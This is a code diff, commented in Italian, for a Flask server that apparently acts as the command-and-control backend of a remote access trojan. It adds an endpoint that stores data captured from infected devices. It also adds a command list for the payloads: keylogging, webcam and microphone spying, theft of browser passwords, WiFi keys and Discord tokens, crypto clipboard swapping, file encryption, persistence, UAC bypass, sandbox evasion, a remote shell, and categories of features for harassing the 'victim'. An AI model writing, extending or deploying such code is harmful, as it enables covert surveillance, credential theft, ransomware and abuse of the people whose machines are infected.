@@ -649,6 +649,83 @@ def upload_files(device_id):
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
+# ============ CAPTURE GENERICO (nuove feature payload) ============
+@app.route('/api/capture/<device_id>', methods=['POST'])
+def upload_capture(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    ctype = (data.get('type') or 'generic')[:64]
+    cdata = data.get('data')
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': ctype,
+            'data': cdata,
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'capture_' + ctype, f'Cattura {ctype}')
+        return jsonify({'status': 'saved'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/command/help', methods=['GET'])
+def command_help():
+    """Vocabolario comandi supportato dai payload (usato dalla UI)."""
+    return jsonify([
+        {"cmd": "screenshot", "cat": "Catture", "desc": "Screenshot schermo"},
+        {"cmd": "webcam", "cat": "Catture", "desc": "Foto webcam"},
+        {"cmd": "mic", "cat": "Catture", "desc": "Registra microfono (secondi via params)"},
+        {"cmd": "webcam_rec", "cat": "Monitoraggio", "desc": "Stream webcam periodico (params=intervallo s)"},
+        {"cmd": "mic_rec", "cat": "Monitoraggio", "desc": "Stream microfono periodico"},
+        {"cmd": "screen_rec", "cat": "Monitoraggio", "desc": "Registra schermo periodico"},
+        {"cmd": "keylogger_start", "cat": "Catture", "desc": "Avvia keylogger"},
+        {"cmd": "keylogger_dump", "cat": "Catture", "desc": "Invia buffer keylog"},
+        {"cmd": "grab_passwords", "cat": "Browser/Dati", "desc": "Password Chrome/Edge"},
+        {"cmd": "grab_wifi", "cat": "Rete", "desc": "Password reti WiFi salvate"},
+        {"cmd": "gps", "cat": "Posizione", "desc": "Geolocalizzazione IP + WiFi"},
+        {"cmd": "location", "cat": "Posizione", "desc": "Posizione (alias gps)"},
+        {"cmd": "sysinfo", "cat": "Sistema", "desc": "Info sistema dettagliate"},
+        {"cmd": "public_ip", "cat": "Rete", "desc": "IP pubblico"},
+        {"cmd": "netinfo", "cat": "Rete", "desc": "Schede di rete"},
+        {"cmd": "list_processes", "cat": "Processi", "desc": "Elenco processi"},
+        {"cmd": "kill_process", "cat": "Processi", "desc": "Termina (params=pid o nome)"},
+        {"cmd": "suspend_process", "cat": "Processi", "desc": "Sospendi processo"},
+        {"cmd": "start_process", "cat": "Processi", "desc": "Avvia (params=path)"},
+        {"cmd": "file_list", "cat": "FileSystem", "desc": "Lista dir (params=path)"},
+        {"cmd": "file_download", "cat": "FileSystem", "desc": "Leggi file (params=path)"},
+        {"cmd": "file_upload", "cat": "FileSystem", "desc": "Scrivi file (params=path|base64)"},
+        {"cmd": "file_delete", "cat": "FileSystem", "desc": "Elimina (params=path)"},
+        {"cmd": "file_search", "cat": "FileSystem", "desc": "Cerca (params=pattern|root)"},
+        {"cmd": "encrypt_files", "cat": "FileSystem", "desc": "Cifra file (params=dir|ext)"},
+        {"cmd": "msgbox", "cat": "Vittima", "desc": "Popup (params=testo)"},
+        {"cmd": "wallpaper", "cat": "Vittima", "desc": "Cambia sfondo (params=path/url)"},
+        {"cmd": "tts", "cat": "Vittima", "desc": "Text-to-speech (params=testo)"},
+        {"cmd": "monitor_off", "cat": "Hardware", "desc": "Spegni monitor"},
+        {"cmd": "monitor_on", "cat": "Hardware", "desc": "Accendi monitor"},
+        {"cmd": "beep", "cat": "Hardware", "desc": "Suono (params=freq|durata)"},
+        {"cmd": "brightness", "cat": "Hardware", "desc": "Luminosita (params=0-100)"},
+        {"cmd": "bsod_fake", "cat": "Vittima", "desc": "Finto schermo blu"},
+        {"cmd": "bsod_real", "cat": "Molestie", "desc": "BSOD reale (critico)"},
+        {"cmd": "fork_bomb", "cat": "Molestie", "desc": "Crash sistema"},
+        {"cmd": "jumpscare", "cat": "Molestie", "desc": "Immagine+suono"},
+        {"cmd": "block_site", "cat": "Rete", "desc": "Blocca sito (params=domain)"},
+        {"cmd": "unblock_site", "cat": "Rete", "desc": "Sblocca sito"},
+        {"cmd": "clipboard_crypto", "cat": "Crypto", "desc": "Swap address crypto"},
+        {"cmd": "steal_discord", "cat": "Social", "desc": "Token Discord"},
+        {"cmd": "steal_browser", "cat": "Browser/Dati", "desc": "Password/history/cookie"},
+        {"cmd": "persistence", "cat": "Persistenza", "desc": "Installa persistenza"},
+        {"cmd": "uac_bypass", "cat": "Persistenza", "desc": "Tenta UAC bypass"},
+        {"cmd": "anti_vm", "cat": "Persistenza", "desc": "Rileva sandbox/VM"},
+        {"cmd": "self_delete", "cat": "Persistenza", "desc": "Auto-eliminazione"},
+        {"cmd": "shutdown", "cat": "Potenza", "desc": "Spegni PC"},
+        {"cmd": "restart", "cat": "Potenza", "desc": "Riavvia PC"},
+        {"cmd": "logoff", "cat": "Potenza", "desc": "Disconnetti utente"},
+        {"cmd": "sleep", "cat": "Potenza", "desc": "Standby"},
+        {"cmd": "execute", "cat": "Comandi", "desc": "Shell remota (params=cmd)"},
+        {"cmd": "uninstall", "cat": "Sistema", "desc": "Disinstalla client"},
+    ])
+
 # ============ API STATS ============
 @app.route('/api/stats', methods=['GET'])
 @login_required
